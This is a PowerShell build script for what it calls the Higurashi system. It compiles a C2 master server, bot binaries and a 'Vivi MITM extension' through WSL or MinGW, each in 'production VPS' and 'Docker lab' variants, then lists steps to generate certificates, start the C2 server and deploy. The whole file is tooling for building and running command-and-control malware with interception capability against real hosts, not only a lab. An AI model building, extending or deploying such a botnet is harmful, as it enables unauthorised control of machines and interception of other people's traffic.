# compile_windows.ps1 - Compile Higurashi system on Windows with WSL or MinGW
# Author: Higurama System
# Version: 2.0.0

Write-Host "====================================" -ForegroundColor Cyan
Write-Host "  🌸 Higurashi Compilation (Win)  " -ForegroundColor Magenta
Write-Host "====================================" -ForegroundColor Cyan
Write-Host ""

# Check if WSL is available
$wslAvailable = $false
try {
    $wslCheck = wsl --status 2>&1
    if ($LASTEXITCODE -eq 0) {
        $wslAvailable = $true
        Write-Host "✓ WSL detected" -ForegroundColor Green
    }
} catch {
    Write-Host "✗ WSL not available" -ForegroundColor Yellow
}

# Check if MinGW is available
$mingwAvailable = $false
try {
    $gccCheck = gcc --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        $mingwAvailable = $true
        Write-Host "✓ MinGW/GCC detected" -ForegroundColor Green
    }
} catch {
    Write-Host "✗ MinGW/GCC not available" -ForegroundColor Yellow
}

Write-Host ""

if (-not $wslAvailable -and -not $mingwAvailable) {
    Write-Host "ERROR: Neither WSL nor MinGW detected!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Install options:" -ForegroundColor Yellow
    Write-Host "  1. WSL (recommended):" -ForegroundColor White
    Write-Host "     wsl --install" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  2. MinGW-w64:" -ForegroundColor White
    Write-Host "     Download from: https://www.mingw-w64.org/" -ForegroundColor Gray
    Write-Host ""
    exit 1
}

# Prefer WSL for Linux-specific code
if ($wslAvailable) {
    Write-Host "Using WSL for compilation..." -ForegroundColor Cyan
    Write-Host ""
    
    # Check if dependencies are installed in WSL
    Write-Host "Checking WSL dependencies..." -ForegroundColor Yellow
    wsl bash -c "sudo apt-get update && sudo apt-get install -y build-essential libssl-dev libssh-dev libjson-c-dev libcurl4-openssl-dev"
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Warning: Dependency installation may have failed" -ForegroundColor Yellow
    }
    
    Write-Host ""
    Write-Host "Compiling C2 Master (Higurama)..." -ForegroundColor Cyan
    wsl bash -c "gcc -Wall -Wextra -O2 -I. -o higurama c2_master.c -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl"
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ C2 Master compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ C2 Master compilation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host ""
    Write-Host "Compiling Higurashi Bot (Production)..." -ForegroundColor Cyan
    wsl bash -c "gcc -Wall -Wextra -O2 -I. -o higurashi_prod higurashi.c -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl"
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Higurashi (production) compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ Higurashi (production) compilation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host ""
    Write-Host "Compiling Higurashi Bot (Docker Lab)..." -ForegroundColor Cyan
    wsl bash -c 'gcc -Wall -Wextra -O2 -I. -DC2_IP="\"172.20.0.10\"" -o higurashi_docker higurashi.c -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl'
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Higurashi (docker) compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ Higurashi (docker) compilation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host ""
    Write-Host "Compiling Vivi MITM Extension (Production)..." -ForegroundColor Cyan
    wsl bash -c "gcc -Wall -Wextra -O2 -I. -o vivi_prod bot_vivi.c -lssl -lcrypto -ljson-c"
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Vivi (production) compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ Vivi (production) compilation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host ""
    Write-Host "Compiling Vivi MITM Extension (Docker Lab)..." -ForegroundColor Cyan
    wsl bash -c 'gcc -Wall -Wextra -O2 -I. -DC2_IP="\"172.20.0.10\"" -o vivi_docker bot_vivi.c -lssl -lcrypto -ljson-c'
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Vivi (docker) compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ Vivi (docker) compilation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host ""
    Write-Host "Compiling Animation Test..." -ForegroundColor Cyan
    wsl bash -c "gcc -Wall -O2 -I. -o test_animations test_animations.c -lpthread"
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Animation test compiled successfully!" -ForegroundColor Green
    } else {
        Write-Host "✗ Animation test compilation failed!" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "====================================" -ForegroundColor Cyan
    Write-Host "  🎉 COMPILATION COMPLETE!         " -ForegroundColor Green
    Write-Host "====================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Binaries created (in WSL):" -ForegroundColor Yellow
    Write-Host "  - higurama         (C2 master server)" -ForegroundColor White
    Write-Host "  - higurashi_prod   (Bot for production VPS)" -ForegroundColor White
    Write-Host "  - higurashi_docker (Bot for Docker lab)" -ForegroundColor White
    Write-Host "  - vivi_prod        (MITM extension for production)" -ForegroundColor White
    Write-Host "  - vivi_docker      (MITM extension for Docker)" -ForegroundColor White
    Write-Host "  - test_animations  (Thread safety test)" -ForegroundColor White
    Write-Host ""
    Write-Host "Next steps:" -ForegroundColor Cyan
    Write-Host "  1. Generate SSL certificates:" -ForegroundColor Yellow
    Write-Host "     wsl bash -c `"openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=higurama'`"" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  2. Test animations:" -ForegroundColor Yellow
    Write-Host "     wsl ./test_animations" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  3. Start C2 server:" -ForegroundColor Yellow
    Write-Host "     wsl ./higurama" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  4. Deploy to Docker lab:" -ForegroundColor Yellow
    Write-Host "     docker-compose up -d" -ForegroundColor Gray
    Write-Host "     docker exec -it higurama-c2 bash" -ForegroundColor Gray
    Write-Host ""
    
} elseif ($mingwAvailable) {
    Write-Host "Using MinGW for compilation..." -ForegroundColor Cyan
    Write-Host ""
    Write-Host "WARNING: MinGW may have issues with pthread and Linux-specific libs" -ForegroundColor Yellow
    Write-Host "Consider using WSL instead for best compatibility." -ForegroundColor Yellow
    Write-Host ""
    
    # MinGW compilation (simplified, may not work fully)
    Write-Host "Attempting MinGW compilation (experimental)..." -ForegroundColor Yellow
    
    gcc -Wall -Wextra -O2 -I. -o higurama.exe c2_master.c -lws2_32 -lpthread
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✓ Basic compilation succeeded" -ForegroundColor Green
        Write-Host "NOTE: This may not include all Linux libraries (SSL, SSH, etc.)" -ForegroundColor Yellow
    } else {
        Write-Host "✗ MinGW compilation failed" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "For full functionality, use WSL or compile directly on Linux VPS" -ForegroundColor Cyan
Write-Host ""
